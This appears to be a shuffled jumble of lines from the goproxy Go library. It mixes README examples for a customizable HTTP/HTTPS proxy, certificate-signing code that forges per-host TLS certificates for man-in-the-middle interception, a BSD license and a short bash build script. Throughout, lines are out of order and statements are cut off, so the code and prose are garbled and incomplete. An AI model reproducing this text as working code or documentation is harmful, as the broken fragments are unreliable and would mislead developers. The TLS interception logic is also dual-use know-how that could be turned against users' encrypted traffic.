    proxy.Verbose = true
 License
"connection using ""Man in the Middle"" style attack."
 Introduction
A possible use case that suits goproxy but
 h <= 17 {
" will receive a function that will preprocess the request. We can change the request, or"
status.svg)](https://godoc.org/github.com/elazarl/goproxy)
[![Join the chat at https://gitter.im/elazarl/goproxy](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/elazarl/goproxy
http.Response) {
[the eavesdropper example](https://github.com/elazarl/goproxy/blob/master/examples/goproxy-eavesdropper/main.go
"At any rate, user feedback is very important for me, so I'll be delighted to know if you're using this package."
", a basic HTTP/HTTPS transparent proxy"
[![GoDoc](https://godoc.org/github.com/elazarl/goproxy
before their development.
"I'll try to keep reasonable backwards compatibility. In case of a major API change,"
Hijack
 Beta Software
New features will be discussed on the [mailing list](https://groups.google.com/forum/
respHandlers    []RespHandler 
"// only got the URL.Hostname and URL.Port during the HTTP CONNECT phase if the scheme is HTTPS, which is"
utm_content=badge)
"as customizable as goproxy intends to be. The main difference is, Fiddler is not"
proxy.OnRequest(goproxy.UrlMatches(regexp.MustCompile(
utm_medium=badge
"// This will NOT reject the HTTPS request with URL ending with gif, due to the fact that proxy "
 and returning a boolean.
// Add handlers to httpsHandlers 
"return a response. If the time is between 8:00am and 17:00pm, we will reject the request, and"
utm_source=badge
With goproxy you could ask all your users to set their proxy to a dedicated machine running a
// with destination host
"Package goproxy provides a customizable HTTP proxy library for Go (golang),"
gopkg.in/elazarl/goproxy.v1
 What's New
 Type of handlers for manipulating connect/req/resp behavior
2. Transparent proxy support for http/https including MITM certificate generation for TLS.  See the [transparent example.](https://github.com/elazarl/goproxy/tree/master/examples/goproxy-transparent)
We will only process requests that match the condition. 
httpsHandlers   []HttpsHandler
goproxy
        }
X-GoProxy: yxorPoG-X
    
package main
"http.Request,"
    proxy := goproxy.NewProxyHttpServer()
sort.Strings(c)
"template.DNSNames = append(template.DNSNames, h)"
return h.Sum(nil)
var x509ca 
panic(err)
KeyUsage:              x509.KeyUsageKeyEncipherment 
default:
"err = fmt.Errorf(""unsupported key type %T"", ca.PrivateKey)"
if ip := net.ParseIP(h)
"""crypto/x509"""
func hashSortedBigInt(lst []string) 
tls.Certificate{
"tls.Certificate, err error) {"
"c := make([]string, len(lst))"
"hash := hashSorted(append(hosts, goproxySignerVersion, "":"""
"for _, s := range c {"
"start := time.Unix(0, 0)"
"func signHost(ca tls.Certificate, hosts []string) (cert "
"// TODO(elazar): instead of this ugly hack, just encode the certificate and hash the binary form."
rand.Seed(time.Now().UnixNano())
"SerialNumber: serial,"
"if certpriv, err = ecdsa.GenerateKey(elliptic.P256(), "
"if certpriv, err = rsa.GenerateKey("
"if csprng, err = NewCounterEncryptorRandFromKey(ca.PrivateKey, hash)"
"""crypto/elliptic"""
"copy(c, lst)"
"ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},"
" x509.KeyUsageDigitalSignature,"
var certpriv crypto.Signer
switch ca.PrivateKey.(type) {
"csprng, "
"template.IPAddresses = append(template.IPAddresses, ip)"
"PrivateKey:  certpriv,"
package goproxy
 err != nil {
var csprng CounterEncryptorRand
" "",""))"
} else {
"Issuer:       x509ca.Subject,"
"Organization: []string{""GoProxy untrusted MITM proxy Inc""},"
h := sha1.New()
"""math/rand"""
"Certificate: [][]byte{derBytes, ca.Certificate[0]},"
if err != nil {
case 
rsa.PrivateKey:
"""fmt"""
"for _, h := range hosts {"
import (
big.Int {
"""math/big"""
 ip != nil {
"""crypto/ecdsa"""
csprng)
serial := big.NewInt(rand.Int63())
// Use the provided ca and not the global GoproxyCa for certificate generation.
"template, x509ca, certpriv.Public(), ca.PrivateKey)"
"NotBefore: start,"
"""net"""
h.Write([]byte(s 
"}, nil"
func init() {
Subject: pkix.Name{
return rv
"""time"""
return 
"""crypto/rsa"""
runtime.Version()))
"end, err := time.Parse(""2006-01-02"", ""2049-12-31"")"
rv.SetBytes(hashSorted(lst))
template := x509.Certificate{
"BasicConstraintsValid: true,"
"NotAfter:  end,"
"csprng, 2048)"
ecdsa.PrivateKey:
"""runtime"""
rv := new(big.Int)
// Avoid deterministic random numbers
x509.Certificate
"if derBytes, err = x509.CreateCertificate("
"""crypto"""
template.Subject.CommonName = h
"var goproxySignerVersion = "":goroxy1"""
func hashSorted(lst []string) []byte {
return
"""sort"""
"""crypto/sha1"""
"if x509ca, err = x509.ParseCertificate(ca.Certificate[0])"
var derBytes []byte
"""crypto/tls"""
"""crypto/x509/pkix"""
 OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
this software without specific prior written permission.
"LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR"
 Redistributions in binary form must reproduce the above
"DATA, OR PROFITS"
"modification, are permitted provided that the following conditions are"
" LOSS OF USE,"
"Redistribution and use in source and binary forms, with or without"
"OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."
"""AS IS"" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT"
"OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,"
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 Neither the name of Elazar Leibovich. nor the names of its
Copyright (c) 2012 Elazar Leibovich. All rights reserved.
A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
"THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT"
"notice, this list of conditions and the following disclaimer."
"copyright notice, this list of conditions and the following disclaimer"
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
"SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT"
"LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES"
in the documentation and/or other materials provided with the
met:
 Redistributions of source code must retain the above copyright
distribution.
contributors may be used to endorse or promote products derived from
for action in $@
 exit
done
_test.go -maxdepth 0 2>/dev/null
go test
find 
 ext/
 done
 do go $action
go build -o ../../bin/$(basename $d)
 -maxdepth 0 -type d 
go test 
!/bin/bash
done)
find regretable examples/
while read f
break
mkdir -p bin
 while read d
(cd $d
http.Response){
supporting hijacking HTTPS connection.
The proxy itself is simply an 
Typical usage is
proxy.OnResponse(..conditions..).Do(..responesHandler..)
"To print the content type of all responses from a certain url, we'll add a"
proxy.OnResponse(..conditions..).DoFunc(..responesHandlerFunction..)
proxy.OnResponse().DoFunc(func(r 
"http.Response,ctx "
"http.Request,ctx "
Will warn if multiple versions of jquery are used in the same domain.
goproxy.ProxyCtx)
when the proxy will detect html pieces sent as a response to AJAX
5. https://github.com/elazarl/goproxy/tree/master/examples/goproxy-jquery-version
"http.Response, ctx "
"return resp.Header.Get(""X-GoProxy"") != """""
"http.Request, "
proxy.OnRequest().DoFunc(func(r 
4. https://github.com/elazarl/goproxy/tree/master/examples/goproxy-no-reddit-at-worktime
Will allow browsing to reddit.com between 8:00am and 17:00pm
3. https://github.com/elazarl/goproxy/blob/master/examples/goproxy-httpdump/
var hasGoProxyHeader = RespConditionFunc(func(resp 
Example use cases:
goproxy.ProxyCtx) (
return rand.Intn(1) == 0
Modifies image files in an HTTP response via goproxy's image extension found in ext/.
http.Request)bool {
proxy.OnResponse(hasGoProxyHeader).DoFunc(func(r
"http.ListenAndServe("":8080"", proxy)"
6. https://github.com/elazarl/goproxy/blob/master/examples/goproxy-upside-down-ternet/
interaction with the proxy.
"yet, customizable and programable."
"Finally, we have convenience function to throw a quick response"
"proxy.OnResponse(goproxy.UrlIs(""golang.org/pkg"")).DoFunc(func(r "
"all the QA team to access the website by a proxy, and the proxy will"
1. https://github.com/elazarl/goproxy/tree/master/examples/goproxy-avgsize
package goproxy
net/http
measure the average size of all text/html responses from your host.
"we close the body of the original repsonse, and return a new 403 response with a short message."
"r.Header.Set(""X-GoProxy"",""1"")"
http.Response{
note that we used the ProxyCtx context variable here. It contains the request
ReqCondition to the OnResponse function:
"println(ctx.Req.Host,""->"",r.Header.Get(""Content-Type""))"
return r
http.Request) bool {
"http.Response,req "
"make sense to read the response, if you still haven't got it!"
proxy := goproxy.NewProxyHttpServer()
var random = ReqConditionFunc(func(r 
"return goproxy.NewResponse(ctx.Req, goproxy.ContentTypeText, http.StatusForbidden, ""Can't see response with X-GoProxy header!"")"
Generate a real traffic to your website by real users using through
"proxy. Record the traffic, and try it again for more real load testing."
"return r, nil"
Note that the function is called before the proxy sends the request to the server
"Caution! If you give a RespCondition to the OnRequest function, you'll get a run time panic! It doesn't"
"request, it'll send a warning email."
"All requests to your web servers should be directed through the proxy,"
To measure the average size of an Html served in your site. One can ask
"Package goproxy provides a customizable HTTP proxy,"
proxy.OnRequest(..conditions..).Do(..requesthandler..)
2. [not yet implemented]
"We can write the condition ourselves, conditions can be set on request and on response"
For printing the content type of all incoming responses
 handler.
"The intent of the proxy, is to be usable with reasonable amount of traffic"
proxy.OnRequest(..conditions..).DoFunc(..requesthandlerFunction..)
http.Response {
r.Body.Close()
Adding a header to each request
"and the response (Req and Resp, Resp is nil if unavailable) of this specific client"
CounterEncryptorRand) Seed(b []byte) {
if seed != nil {
if n = len(c.rand) - c.ix
import (
if c.ix == len(c.rand) {
ix      int
"copy(r.counter, h.Sum(seed)[:r.cipher.BlockSize()])"
"""crypto/aes"""
"""crypto/ecdsa"""
if c.counter[i]
"if keyBytes, err = x509.MarshalECPrivateKey(key)"
 c.counter[i] != 0 {
ecdsa.PrivateKey:
r.ix = len(r.rand)
"c.cipher.Encrypt(c.rand, c.counter)"
default:
"copy(c.counter, b)"
"panic(""SetCounter: wrong counter size"")"
keyBytes = x509.MarshalPKCS1PrivateKey(key)
"err = errors.New(""only RSA and ECDSA keys supported"")"
 n > len(b) {
c.ix = 0
"""crypto/cipher"""
if len(b) != len(c.counter) {
c.refill()
var keyBytes []byte
for i := 0
"""crypto/x509"""
func (c 
cipher  cipher.Block
switch key := key.(type) {
package goproxy
 err != nil {
h := sha256.New()
"func NewCounterEncryptorRandFromKey(key interface{}, seed []byte) (r CounterEncryptorRand, err error) {"
counter []byte
"copy(b, c.rand[c.ix:c.ix"
"""crypto/sha256"""
"r.counter = make([]byte, r.cipher.BlockSize())"
rand    []byte
return
"r.rand = make([]byte, r.cipher.BlockSize())"
"if r.cipher, err = aes.NewCipher(h.Sum(keyBytes)[:aes.BlockSize])"
 i < len(c.counter)
"CounterEncryptorRand) Read(b []byte) (n int, err error) {"
break
"""errors"""
n = len(b)
c.ix 
case 
rsa.PrivateKey:
"""crypto/rsa"""
type CounterEncryptorRand struct {
CounterEncryptorRand) refill() {
